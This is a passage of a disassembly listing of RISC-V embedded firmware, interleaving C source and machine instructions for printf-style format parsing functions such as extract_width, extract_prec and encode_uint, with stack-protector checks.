static inline const char *extract_width(struct conversion *conv,
					const char *sp)
{
80002560:	7179                	addi	sp,sp,-48
80002562:	d606                	sw	ra,44(sp)
80002564:	d422                	sw	s0,40(sp)
80002566:	d226                	sw	s1,36(sp)
80002568:	842a                	mv	s0,a0
8000256a:	c62e                	sw	a1,12(sp)
8000256c:	8000c7b7          	lui	a5,0x8000c
80002570:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002574:	ce3a                	sw	a4,28(sp)
80002576:	4701                	li	a4,0
	conv->width_present = true;
80002578:	00055783          	lhu	a5,0(a0)
8000257c:	0807e793          	ori	a5,a5,128
80002580:	00f51023          	sh	a5,0(a0)

	if (*sp == '*') {
80002584:	84ae                	mv	s1,a1
80002586:	0005c703          	lbu	a4,0(a1)
8000258a:	02a00793          	li	a5,42
8000258e:	04f70a63          	beq	a4,a5,800025e2 <extract_width+0x82>
		conv->width_star = true;
		return ++sp;
	}

	const char *wp = sp;
	size_t width = extract_decimal(&sp);
80002592:	0068                	addi	a0,sp,12
80002594:	3d55                	jal	80002448 <extract_decimal>

	if (sp != wp) {
80002596:	47b2                	lw	a5,12(sp)
80002598:	02f48763          	beq	s1,a5,800025c6 <extract_width+0x66>
		conv->width_present = true;
8000259c:	00045783          	lhu	a5,0(s0)
800025a0:	0807e793          	ori	a5,a5,128
800025a4:	00f41023          	sh	a5,0(s0)
		conv->width_value = width;
800025a8:	c048                	sw	a0,4(s0)
		conv->unsupported |= ((conv->width_value < 0)
800025aa:	401c                	lw	a5,0(s0)
800025ac:	8385                	srli	a5,a5,0x1
800025ae:	8b85                	andi	a5,a5,1
				      || (width != (size_t)conv->width_value));
800025b0:	04054363          	bltz	a0,800025f6 <extract_width+0x96>
800025b4:	4701                	li	a4,0
		conv->unsupported |= ((conv->width_value < 0)
800025b6:	8fd9                	or	a5,a5,a4
800025b8:	0786                	slli	a5,a5,0x1
800025ba:	00045703          	lhu	a4,0(s0)
800025be:	9b75                	andi	a4,a4,-3
800025c0:	8fd9                	or	a5,a5,a4
800025c2:	00f41023          	sh	a5,0(s0)
	}

	return sp;
800025c6:	4532                	lw	a0,12(sp)
}
800025c8:	8000c7b7          	lui	a5,0x8000c
800025cc:	4772                	lw	a4,28(sp)
800025ce:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800025d2:	8fb9                	xor	a5,a5,a4
800025d4:	4701                	li	a4,0
800025d6:	e395                	bnez	a5,800025fa <extract_width+0x9a>
800025d8:	50b2                	lw	ra,44(sp)
800025da:	5422                	lw	s0,40(sp)
800025dc:	5492                	lw	s1,36(sp)
800025de:	6145                	addi	sp,sp,48
800025e0:	8082                	ret
		conv->width_star = true;
800025e2:	00055783          	lhu	a5,0(a0)
800025e6:	1007e793          	ori	a5,a5,256
800025ea:	00f51023          	sh	a5,0(a0)
		return ++sp;
800025ee:	00158513          	addi	a0,a1,1
800025f2:	c62a                	sw	a0,12(sp)
800025f4:	bfd1                	j	800025c8 <extract_width+0x68>
				      || (width != (size_t)conv->width_value));
800025f6:	4705                	li	a4,1
800025f8:	bf7d                	j	800025b6 <extract_width+0x56>
}
800025fa:	6f8030ef          	jal	ra,80005cf2 <_StackCheckHandler>

800025fe <extract_prec>:
 *
 * @return a pointer the first character that follows the precision.
 */
static inline const char *extract_prec(struct conversion *conv,
				       const char *sp)
{
800025fe:	7179                	addi	sp,sp,-48
80002600:	d606                	sw	ra,44(sp)
80002602:	d422                	sw	s0,40(sp)
80002604:	c62e                	sw	a1,12(sp)
80002606:	8000c7b7          	lui	a5,0x8000c
8000260a:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000260e:	ce3a                	sw	a4,28(sp)
80002610:	4701                	li	a4,0
	conv->prec_present = (*sp == '.');
80002612:	0005c703          	lbu	a4,0(a1)
80002616:	fd270713          	addi	a4,a4,-46
8000261a:	00173693          	seqz	a3,a4
8000261e:	06a6                	slli	a3,a3,0x9
80002620:	00055783          	lhu	a5,0(a0)
80002624:	dff7f793          	andi	a5,a5,-513
80002628:	8fd5                	or	a5,a5,a3
8000262a:	00f51023          	sh	a5,0(a0)

	if (!conv->prec_present) {
8000262e:	eb31                	bnez	a4,80002682 <extract_prec+0x84>
80002630:	842a                	mv	s0,a0
		return sp;
	}
	++sp;
80002632:	47b2                	lw	a5,12(sp)
80002634:	00178713          	addi	a4,a5,1
80002638:	c63a                	sw	a4,12(sp)

	if (*sp == '*') {
8000263a:	0017c703          	lbu	a4,1(a5)
8000263e:	02a00793          	li	a5,42
80002642:	04f70263          	beq	a4,a5,80002686 <extract_prec+0x88>
		conv->prec_star = true;
		return ++sp;
	}

	size_t prec = extract_decimal(&sp);
80002646:	0068                	addi	a0,sp,12
80002648:	3501                	jal	80002448 <extract_decimal>

	conv->prec_value = prec;
8000264a:	c408                	sw	a0,8(s0)
	conv->unsupported |= ((conv->prec_value < 0)
8000264c:	401c                	lw	a5,0(s0)
8000264e:	8385                	srli	a5,a5,0x1
80002650:	8b85                	andi	a5,a5,1
			      || (prec != (size_t)conv->prec_value));
80002652:	04054463          	bltz	a0,8000269a <extract_prec+0x9c>
80002656:	4701                	li	a4,0
	conv->unsupported |= ((conv->prec_value < 0)
80002658:	8fd9                	or	a5,a5,a4
8000265a:	0786                	slli	a5,a5,0x1
8000265c:	00045703          	lhu	a4,0(s0)
80002660:	9b75                	andi	a4,a4,-3
80002662:	8fd9                	or	a5,a5,a4
80002664:	00f41023          	sh	a5,0(s0)

	return sp;
80002668:	4532                	lw	a0,12(sp)
}
8000266a:	8000c7b7          	lui	a5,0x8000c
8000266e:	4772                	lw	a4,28(sp)
80002670:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002674:	8fb9                	xor	a5,a5,a4
80002676:	4701                	li	a4,0
80002678:	e39d                	bnez	a5,8000269e <extract_prec+0xa0>
8000267a:	50b2                	lw	ra,44(sp)
8000267c:	5422                	lw	s0,40(sp)
8000267e:	6145                	addi	sp,sp,48
80002680:	8082                	ret
		return sp;
80002682:	852e                	mv	a0,a1
80002684:	b7dd                	j	8000266a <extract_prec+0x6c>
		conv->prec_star = true;
80002686:	00055783          	lhu	a5,0(a0)
8000268a:	4007e793          	ori	a5,a5,1024
8000268e:	00f51023          	sh	a5,0(a0)
		return ++sp;
80002692:	4532                	lw	a0,12(sp)
80002694:	0505                	addi	a0,a0,1
80002696:	c62a                	sw	a0,12(sp)
80002698:	bfc9                	j	8000266a <extract_prec+0x6c>
			      || (prec != (size_t)conv->prec_value));
8000269a:	4705                	li	a4,1
8000269c:	bf75                	j	80002658 <extract_prec+0x5a>
}
8000269e:	654030ef          	jal	ra,80005cf2 <_StackCheckHandler>

800026a2 <extract_length>:
 *
 * @return a pointer the first character that follows the precision.
 */
static inline const char *extract_length(struct conversion *conv,
					 const char *sp)
{
800026a2:	1101                	addi	sp,sp,-32
800026a4:	ce06                	sw	ra,28(sp)
800026a6:	862a                	mv	a2,a0
800026a8:	8000c7b7          	lui	a5,0x8000c
800026ac:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800026b0:	c63a                	sw	a4,12(sp)
800026b2:	4701                	li	a4,0
	switch (*sp) {
800026b4:	0005c783          	lbu	a5,0(a1)
800026b8:	fb478793          	addi	a5,a5,-76
800026bc:	0ff7f693          	zext.b	a3,a5
800026c0:	02e00713          	li	a4,46
800026c4:	12d76763          	bltu	a4,a3,800027f2 <extract_length+0x150>
800026c8:	00269793          	slli	a5,a3,0x2
800026cc:	80008737          	lui	a4,0x80008
800026d0:	db070713          	addi	a4,a4,-592 # 80007db0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007db1>
800026d4:	97ba                	add	a5,a5,a4
800026d6:	439c                	lw	a5,0(a5)
800026d8:	8782                	jr	a5
	case 'h':
		if (*++sp == 'h') {
800026da:	00158513          	addi	a0,a1,1
800026de:	0015c703          	lbu	a4,1(a1)
800026e2:	06800793          	li	a5,104
800026e6:	00f70d63          	beq	a4,a5,80002700 <extract_length+0x5e>
			conv->length_mod = LENGTH_HH;
			++sp;
		} else {
			conv->length_mod = LENGTH_H;
800026ea:	00065783          	lhu	a5,0(a2)
800026ee:	7761                	lui	a4,0xffff8
800026f0:	7ff70713          	addi	a4,a4,2047 # ffff87ff <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xffff8800>
800026f4:	8ff9                	and	a5,a5,a4
800026f6:	6705                	lui	a4,0x1
800026f8:	8fd9                	or	a5,a5,a4
800026fa:	00f61023          	sh	a5,0(a2)
800026fe:	a041                	j	8000277e <extract_length+0xdc>
			conv->length_mod = LENGTH_HH;
80002700:	00065783          	lhu	a5,0(a2)
80002704:	7761                	lui	a4,0xffff8
80002706:	7ff70713          	addi	a4,a4,2047 # ffff87ff <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xffff8800>
8000270a:	8ff9                	and	a5,a5,a4
8000270c:	6705                	lui	a4,0x1
8000270e:	80070713          	addi	a4,a4,-2048 # 800 <CONFIG_NEWLIB_LIBC_MIN_REQUIRED_HEAP_SIZE>
80002712:	8fd9                	or	a5,a5,a4
80002714:	00f61023          	sh	a5,0(a2)
			++sp;
80002718:	00258513          	addi	a0,a1,2
8000271c:	a08d                	j	8000277e <extract_length+0xdc>
		}
		break;
	case 'l':
		if (*++sp == 'l') {
8000271e:	00158513          	addi	a0,a1,1
80002722:	0015c703          	lbu	a4,1(a1)
80002726:	06c00793          	li	a5,108
8000272a:	00f70f63          	beq	a4,a5,80002748 <extract_length+0xa6>
			conv->length_mod = LENGTH_LL;
			++sp;
		} else {
			conv->length_mod = LENGTH_L;
8000272e:	00065783          	lhu	a5,0(a2)
80002732:	7761                	lui	a4,0xffff8
80002734:	7ff70713          	addi	a4,a4,2047 # ffff87ff <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xffff8800>
80002738:	8ff9                	and	a5,a5,a4
8000273a:	6709                	lui	a4,0x2
8000273c:	80070713          	addi	a4,a4,-2048 # 1800 <CONFIG_ISR_STACK_SIZE+0x800>
80002740:	8fd9                	or	a5,a5,a4
80002742:	00f61023          	sh	a5,0(a2)
80002746:	a825                	j	8000277e <extract_length+0xdc>
			conv->length_mod = LENGTH_LL;
80002748:	00065783          	lhu	a5,0(a2)
8000274c:	7761                	lui	a4,0xffff8
8000274e:	7ff70713          	addi	a4,a4,2047 # ffff87ff <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xffff8800>
80002752:	8ff9                	and	a5,a5,a4
80002754:	6709                	lui	a4,0x2
80002756:	8fd9                	or	a5,a5,a4
80002758:	00f61023          	sh	a5,0(a2)
			++sp;
8000275c:	00258513          	addi	a0,a1,2
80002760:	a839                	j	8000277e <extract_length+0xdc>
		}
		break;
	case 'j':
		conv->length_mod = LENGTH_J;
80002762:	00055783          	lhu	a5,0(a0)
80002766:	7761                	lui	a4,0xffff8
80002768:	7ff70713          	addi	a4,a4,2047 # ffff87ff <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xffff8800>
8000276c:	8ff9                	and	a5,a5,a4
8000276e:	670d                	lui	a4,0x3
80002770:	80070713          	addi	a4,a4,-2048 # 2800 <CONFIG_ISR_STACK_SIZE+0x1800>
80002774:	8fd9                	or	a5,a5,a4
80002776:	00f51023          	sh	a5,0(a0)
		++sp;
8000277a:	00158513          	addi	a0,a1,1
	default:
		conv->length_mod = LENGTH_NONE;
		break;
	}
	return sp;
}
8000277e:	8000c7b7          	lui	a5,0x8000c
80002782:	4732                	lw	a4,12(sp)
80002784:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002788:	8fb9                	xor	a5,a5,a4
8000278a:	4701                	li	a4,0
8000278c:	efad                	bnez	a5,80002806 <extract_length+0x164>
8000278e:	40f2                	lw	ra,28(sp)
80002790:	6105                	addi	sp,sp,32
80002792:	8082                	ret
		conv->length_mod = LENGTH_Z;
80002794:	00055783          	lhu	a5,0(a0)
80002798:	7761                	lui	a4,0xffff8
8000279a:	7ff70713          	addi	a4,a4,2047 # ffff87ff <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xffff8800>
8000279e:	8ff9                	and	a5,a5,a4
800027a0:	670d                	lui	a4,0x3
800027a2:	8fd9                	or	a5,a5,a4
800027a4:	00f51023          	sh	a5,0(a0)
		++sp;
800027a8:	00158513          	addi	a0,a1,1
		break;
800027ac:	bfc9                	j	8000277e <extract_length+0xdc>
		conv->length_mod = LENGTH_T;
800027ae:	00055783          	lhu	a5,0(a0)
800027b2:	7761                	lui	a4,0xffff8
800027b4:	7ff70713          	addi	a4,a4,2047 # ffff87ff <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xffff8800>
800027b8:	8ff9                	and	a5,a5,a4
800027ba:	6711                	lui	a4,0x4
800027bc:	80070713          	addi	a4,a4,-2048 # 3800 <__kernel_ram_size+0x7d0>
800027c0:	8fd9                	or	a5,a5,a4
800027c2:	00f51023          	sh	a5,0(a0)
		++sp;
800027c6:	00158513          	addi	a0,a1,1
		break;
800027ca:	bf55                	j	8000277e <extract_length+0xdc>
		conv->length_mod = LENGTH_UPPER_L;
800027cc:	00055783          	lhu	a5,0(a0)
800027d0:	7761                	lui	a4,0xffff8
800027d2:	7ff70713          	addi	a4,a4,2047 # ffff87ff <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xffff8800>
800027d6:	8ff9                	and	a5,a5,a4
800027d8:	6711                	lui	a4,0x4
800027da:	8fd9                	or	a5,a5,a4
800027dc:	00f51023          	sh	a5,0(a0)
		++sp;
800027e0:	00158513          	addi	a0,a1,1
		conv->unsupported = true;
800027e4:	07c2                	slli	a5,a5,0x10
800027e6:	83c1                	srli	a5,a5,0x10
800027e8:	0027e793          	ori	a5,a5,2
800027ec:	00f61023          	sh	a5,0(a2)
		break;
800027f0:	b779                	j	8000277e <extract_length+0xdc>
		conv->length_mod = LENGTH_NONE;
800027f2:	00065783          	lhu	a5,0(a2)
800027f6:	7761                	lui	a4,0xffff8
800027f8:	7ff70713          	addi	a4,a4,2047 # ffff87ff <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xffff8800>
800027fc:	8ff9                	and	a5,a5,a4
800027fe:	00f61023          	sh	a5,0(a2)
		break;
80002802:	852e                	mv	a0,a1
	return sp;
80002804:	bfad                	j	8000277e <extract_length+0xdc>
}
80002806:	4ec030ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000280a <extract_specifier>:
 *
 * @return a pointer the first character that follows the specifier.
 */
static inline const char *extract_specifier(struct conversion *conv,
					    const char *sp)
{
8000280a:	1101                	addi	sp,sp,-32
8000280c:	ce06                	sw	ra,28(sp)
8000280e:	872a                	mv	a4,a0
80002810:	8000c7b7          	lui	a5,0x8000c
80002814:	9507a683          	lw	a3,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002818:	c636                	sw	a3,12(sp)
8000281a:	4681                	li	a3,0
	bool unsupported = false;

	conv->specifier = *sp++;
8000281c:	00158513          	addi	a0,a1,1
80002820:	0005c783          	lbu	a5,0(a1)
80002824:	00f701a3          	sb	a5,3(a4)

	switch (conv->specifier) {
80002828:	07800693          	li	a3,120
8000282c:	04f6e163          	bltu	a3,a5,8000286e <extract_specifier+0x64>
80002830:	06e00693          	li	a3,110
80002834:	06d7fb63          	bgeu	a5,a3,800028aa <extract_specifier+0xa0>
80002838:	06900693          	li	a3,105
8000283c:	02f6e963          	bltu	a3,a5,8000286e <extract_specifier+0x64>
80002840:	05800693          	li	a3,88
80002844:	02d7ed63          	bltu	a5,a3,8000287e <extract_specifier+0x74>
80002848:	fa878613          	addi	a2,a5,-88
8000284c:	4685                	li	a3,1
8000284e:	00c696b3          	sll	a3,a3,a2
80002852:	6639                	lui	a2,0xe
80002854:	20060613          	addi	a2,a2,512 # e200 <__rom_region_size+0x5200>
80002858:	8e75                	and	a2,a2,a3
8000285a:	ee1d                	bnez	a2,80002898 <extract_specifier+0x8e>
8000285c:	6605                	lui	a2,0x1
8000285e:	80160613          	addi	a2,a2,-2047 # 801 <CONFIG_NEWLIB_LIBC_MIN_REQUIRED_HEAP_SIZE+0x1>
80002862:	8e75                	and	a2,a2,a3
80002864:	e26d                	bnez	a2,80002946 <extract_specifier+0x13c>
80002866:	00021637          	lui	a2,0x21
8000286a:	8ef1                	and	a3,a3,a2
8000286c:	e2d1                	bnez	a3,800028f0 <extract_specifier+0xe6>
			unsupported = true;
		}
		break;

	default:
		conv->invalid = true;
8000286e:	00075783          	lhu	a5,0(a4)
80002872:	0017e793          	ori	a5,a5,1
80002876:	00f71023          	sh	a5,0(a4)
	bool unsupported = false;
8000287a:	4781                	li	a5,0
		break;
8000287c:	a879                	j	8000291a <extract_specifier+0x110>
	switch (conv->specifier) {
8000287e:	04100693          	li	a3,65
80002882:	00d78b63          	beq	a5,a3,80002898 <extract_specifier+0x8e>
80002886:	fed7e4e3          	bltu	a5,a3,8000286e <extract_specifier+0x64>
8000288a:	fbb78793          	addi	a5,a5,-69
8000288e:	0ff7f793          	zext.b	a5,a5
80002892:	4689                	li	a3,2
80002894:	fcf6ede3          	bltu	a3,a5,8000286e <extract_specifier+0x64>
		conv->specifier_cat = SPECIFIER_FP;
80002898:	00274783          	lbu	a5,2(a4)
8000289c:	9be1                	andi	a5,a5,-8
8000289e:	0047e793          	ori	a5,a5,4
800028a2:	00f70123          	sb	a5,2(a4)
			unsupported = true;
800028a6:	4785                	li	a5,1
			break;
800028a8:	a88d                	j	8000291a <extract_specifier+0x110>
	switch (conv->specifier) {
800028aa:	f9278613          	addi	a2,a5,-110
800028ae:	4685                	li	a3,1
800028b0:	00c696b3          	sll	a3,a3,a2
800028b4:	4826f613          	andi	a2,a3,1154
800028b8:	00c035b3          	snez	a1,a2
800028bc:	e649                	bnez	a2,80002946 <extract_specifier+0x13c>
800028be:	0246f613          	andi	a2,a3,36
800028c2:	00c037b3          	snez	a5,a2
800028c6:	ea45                	bnez	a2,80002976 <extract_specifier+0x16c>
800028c8:	8a85                	andi	a3,a3,1
800028ca:	d2d5                	beqz	a3,8000286e <extract_specifier+0x64>
		conv->specifier_cat = SPECIFIER_PTR;
800028cc:	00274603          	lbu	a2,2(a4)
800028d0:	9a61                	andi	a2,a2,-8
800028d2:	00366613          	ori	a2,a2,3
800028d6:	00c70123          	sb	a2,2(a4)
		if (conv->length_mod == LENGTH_UPPER_L) {
800028da:	00075603          	lhu	a2,0(a4)
800028de:	65a1                	lui	a1,0x8
800028e0:	80058593          	addi	a1,a1,-2048 # 7800 <__kernel_ram_size+0x47d0>
800028e4:	8e6d                	and	a2,a2,a1
800028e6:	6591                	lui	a1,0x4
800028e8:	02b61963          	bne	a2,a1,8000291a <extract_specifier+0x110>
			unsupported = true;
800028ec:	87b6                	mv	a5,a3
800028ee:	a035                	j	8000291a <extract_specifier+0x110>
		conv->specifier_cat = SPECIFIER_SINT;
800028f0:	00274683          	lbu	a3,2(a4)
800028f4:	9ae1                	andi	a3,a3,-8
800028f6:	0016e693          	ori	a3,a3,1
800028fa:	00d70123          	sb	a3,2(a4)
		if (conv->length_mod == LENGTH_UPPER_L) {
800028fe:	00075683          	lhu	a3,0(a4)
80002902:	6621                	lui	a2,0x8
80002904:	80060613          	addi	a2,a2,-2048 # 7800 <__kernel_ram_size+0x47d0>
80002908:	8ef1                	and	a3,a3,a2
8000290a:	6611                	lui	a2,0x4
8000290c:	04c68563          	beq	a3,a2,80002956 <extract_specifier+0x14c>
		if (conv->specifier == 'c') {
80002910:	06300693          	li	a3,99
80002914:	04d78863          	beq	a5,a3,80002964 <extract_specifier+0x15a>
	bool unsupported = false;
80002918:	4781                	li	a5,0
	}

	conv->unsupported |= unsupported;
8000291a:	4314                	lw	a3,0(a4)
8000291c:	8285                	srli	a3,a3,0x1
8000291e:	8a85                	andi	a3,a3,1
80002920:	8fd5                	or	a5,a5,a3
80002922:	0786                	slli	a5,a5,0x1
80002924:	00075683          	lhu	a3,0(a4)
80002928:	9af5                	andi	a3,a3,-3
8000292a:	8fd5                	or	a5,a5,a3
8000292c:	00f71023          	sh	a5,0(a4)

	return sp;
}
80002930:	8000c7b7          	lui	a5,0x8000c
80002934:	4732                	lw	a4,12(sp)
80002936:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000293a:	8fb9                	xor	a5,a5,a4
8000293c:	4701                	li	a4,0
8000293e:	efa1                	bnez	a5,80002996 <extract_specifier+0x18c>
80002940:	40f2                	lw	ra,28(sp)
80002942:	6105                	addi	sp,sp,32
80002944:	8082                	ret
		conv->specifier_cat = SPECIFIER_UINT;
80002946:	00274683          	lbu	a3,2(a4)
8000294a:	9ae1                	andi	a3,a3,-8
8000294c:	0026e693          	ori	a3,a3,2
80002950:	00d70123          	sb	a3,2(a4)
80002954:	b76d                	j	800028fe <extract_specifier+0xf4>
			conv->invalid = true;
80002956:	00075683          	lhu	a3,0(a4)
8000295a:	0016e693          	ori	a3,a3,1
8000295e:	00d71023          	sh	a3,0(a4)
80002962:	b77d                	j	80002910 <extract_specifier+0x106>
			unsupported = (conv->length_mod != LENGTH_NONE);
80002964:	00075783          	lhu	a5,0(a4)
80002968:	66a1                	lui	a3,0x8
8000296a:	80068693          	addi	a3,a3,-2048 # 7800 <__kernel_ram_size+0x47d0>
8000296e:	8ff5                	and	a5,a5,a3
80002970:	00f037b3          	snez	a5,a5
80002974:	b75d                	j	8000291a <extract_specifier+0x110>
		conv->specifier_cat = SPECIFIER_PTR;
80002976:	00274683          	lbu	a3,2(a4)
8000297a:	9ae1                	andi	a3,a3,-8
8000297c:	0036e693          	ori	a3,a3,3
80002980:	00d70123          	sb	a3,2(a4)
		if (conv->length_mod != LENGTH_NONE) {
80002984:	00075683          	lhu	a3,0(a4)
80002988:	6621                	lui	a2,0x8
8000298a:	80060613          	addi	a2,a2,-2048 # 7800 <__kernel_ram_size+0x47d0>
8000298e:	8ef1                	and	a3,a3,a2
80002990:	f6c9                	bnez	a3,8000291a <extract_specifier+0x110>
	bool unsupported = false;
80002992:	87ae                	mv	a5,a1
80002994:	b759                	j	8000291a <extract_specifier+0x110>
}
80002996:	35c030ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000299a <extract_conversion>:
 *
 * @return pointer to the first character that follows the specification.
 */
static inline const char *extract_conversion(struct conversion *conv,
					     const char *sp)
{
8000299a:	1101                	addi	sp,sp,-32
8000299c:	ce06                	sw	ra,28(sp)
8000299e:	cc22                	sw	s0,24(sp)
800029a0:	842a                	mv	s0,a0
800029a2:	8000c7b7          	lui	a5,0x8000c
800029a6:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800029aa:	c63a                	sw	a4,12(sp)
800029ac:	4701                	li	a4,0
	*conv = (struct conversion) {
800029ae:	00052023          	sw	zero,0(a0)
800029b2:	00052223          	sw	zero,4(a0)
800029b6:	00052423          	sw	zero,8(a0)
	/* Skip over the opening %.  If the conversion specifier is %,
	 * that's the only thing that should be there, so
	 * fast-exit.
	 */
	++sp;
	if (*sp == '%') {
800029ba:	0015c783          	lbu	a5,1(a1) # 4001 <__kernel_ram_size+0xfd1>
800029be:	02500713          	li	a4,37
800029c2:	02e78e63          	beq	a5,a4,800029fe <extract_conversion+0x64>
800029c6:	0585                	addi	a1,a1,1
		conv->specifier = *sp++;
		return sp;
	}

	sp = extract_flags(conv, sp);
800029c8:	8522                	mv	a0,s0
800029ca:	ad9ff0ef          	jal	ra,800024a2 <extract_flags>
800029ce:	85aa                	mv	a1,a0
	sp = extract_width(conv, sp);
800029d0:	8522                	mv	a0,s0
800029d2:	3679                	jal	80002560 <extract_width>
800029d4:	85aa                	mv	a1,a0
	sp = extract_prec(conv, sp);
800029d6:	8522                	mv	a0,s0
800029d8:	311d                	jal	800025fe <extract_prec>
800029da:	85aa                	mv	a1,a0
	sp = extract_length(conv, sp);
800029dc:	8522                	mv	a0,s0
800029de:	31d1                	jal	800026a2 <extract_length>
800029e0:	85aa                	mv	a1,a0
	sp = extract_specifier(conv, sp);
800029e2:	8522                	mv	a0,s0
800029e4:	351d                	jal	8000280a <extract_specifier>

	return sp;
}
800029e6:	8000c7b7          	lui	a5,0x8000c
800029ea:	4732                	lw	a4,12(sp)
800029ec:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800029f0:	8fb9                	xor	a5,a5,a4
800029f2:	4701                	li	a4,0
800029f4:	eb91                	bnez	a5,80002a08 <extract_conversion+0x6e>
800029f6:	40f2                	lw	ra,28(sp)
800029f8:	4462                	lw	s0,24(sp)
800029fa:	6105                	addi	sp,sp,32
800029fc:	8082                	ret
		conv->specifier = *sp++;
800029fe:	00258513          	addi	a0,a1,2
80002a02:	00f401a3          	sb	a5,3(s0)
		return sp;
80002a06:	b7c5                	j	800029e6 <extract_conversion+0x4c>
}
80002a08:	2ea030ef          	jal	ra,80005cf2 <_StackCheckHandler>

80002a0c <conversion_radix>:

	return rval;
}

static inline size_t conversion_radix(char specifier)
{
80002a0c:	1101                	addi	sp,sp,-32
80002a0e:	ce06                	sw	ra,28(sp)
80002a10:	8000c7b7          	lui	a5,0x8000c
80002a14:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002a18:	c63a                	sw	a4,12(sp)
80002a1a:	4701                	li	a4,0
	switch (specifier) {
80002a1c:	06f00793          	li	a5,111
80002a20:	04f50063          	beq	a0,a5,80002a60 <conversion_radix+0x54>
80002a24:	02a7f663          	bgeu	a5,a0,80002a50 <conversion_radix+0x44>
80002a28:	07000793          	li	a5,112
80002a2c:	02f50c63          	beq	a0,a5,80002a64 <conversion_radix+0x58>
80002a30:	07800793          	li	a5,120
80002a34:	02f51a63          	bne	a0,a5,80002a68 <conversion_radix+0x5c>
	case 'o':
		return 8;
	case 'p':
	case 'x':
	case 'X':
		return 16;
80002a38:	4541                	li	a0,16
	}
}
80002a3a:	8000c7b7          	lui	a5,0x8000c
80002a3e:	4732                	lw	a4,12(sp)
80002a40:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002a44:	8fb9                	xor	a5,a5,a4
80002a46:	4701                	li	a4,0
80002a48:	e395                	bnez	a5,80002a6c <conversion_radix+0x60>
80002a4a:	40f2                	lw	ra,28(sp)
80002a4c:	6105                	addi	sp,sp,32
80002a4e:	8082                	ret
	switch (specifier) {
80002a50:	05800793          	li	a5,88
80002a54:	00f50463          	beq	a0,a5,80002a5c <conversion_radix+0x50>
80002a58:	4529                	li	a0,10
80002a5a:	b7c5                	j	80002a3a <conversion_radix+0x2e>
		return 16;
80002a5c:	4541                	li	a0,16
80002a5e:	bff1                	j	80002a3a <conversion_radix+0x2e>
		return 8;
80002a60:	4521                	li	a0,8
80002a62:	bfe1                	j	80002a3a <conversion_radix+0x2e>
		return 16;
80002a64:	4541                	li	a0,16
80002a66:	bfd1                	j	80002a3a <conversion_radix+0x2e>
	switch (specifier) {
80002a68:	4529                	li	a0,10
80002a6a:	bfc1                	j	80002a3a <conversion_radix+0x2e>
}
80002a6c:	286030ef          	jal	ra,80005cf2 <_StackCheckHandler>

80002a70 <encode_uint>:
 */
static char *encode_uint(uint_value_type value,
			 struct conversion *conv,
			 char *bps,
			 const char *bpe)
{
80002a70:	7139                	addi	sp,sp,-64
80002a72:	de06                	sw	ra,60(sp)
80002a74:	dc22                	sw	s0,56(sp)
80002a76:	da26                	sw	s1,52(sp)
80002a78:	d84a                	sw	s2,48(sp)
80002a7a:	d64e                	sw	s3,44(sp)
80002a7c:	d452                	sw	s4,40(sp)
80002a7e:	d256                	sw	s5,36(sp)
80002a80:	d05a                	sw	s6,32(sp)
80002a82:	ce5e                	sw	s7,28(sp)
80002a84:	cc62                	sw	s8,24(sp)
80002a86:	89aa                	mv	s3,a0
80002a88:	842e                	mv	s0,a1
80002a8a:	8c32                	mv	s8,a2
80002a8c:	8ab6                	mv	s5,a3
80002a8e:	84ba                	mv	s1,a4
80002a90:	8000c7b7          	lui	a5,0x8000c
80002a94:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002a98:	c63a                	sw	a4,12(sp)
80002a9a:	4701                	li	a4,0
	bool upcase = isupper((int)conv->specifier);
80002a9c:	00364503          	lbu	a0,3(a2)
80002aa0:	800087b7          	lui	a5,0x80008
80002aa4:	0e978793          	addi	a5,a5,233 # 800080e9 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800080ea>
80002aa8:	97aa                	add	a5,a5,a0
80002aaa:	0007cb83          	lbu	s7,0(a5)
80002aae:	003bfb93          	andi	s7,s7,3
	const unsigned int radix = conversion_radix(conv->specifier);
80002ab2:	3fa9                	jal	80002a0c <conversion_radix>
80002ab4:	892a                	mv	s2,a0
	char *bp = bps + (bpe - bps);
80002ab6:	a81d                	j	80002aec <encode_uint+0x7c>

	do {
		unsigned int lsv = (unsigned int)(value % radix);

		*--bp = (lsv <= 9) ? ('0' + lsv)
80002ab8:	4785                	li	a5,1
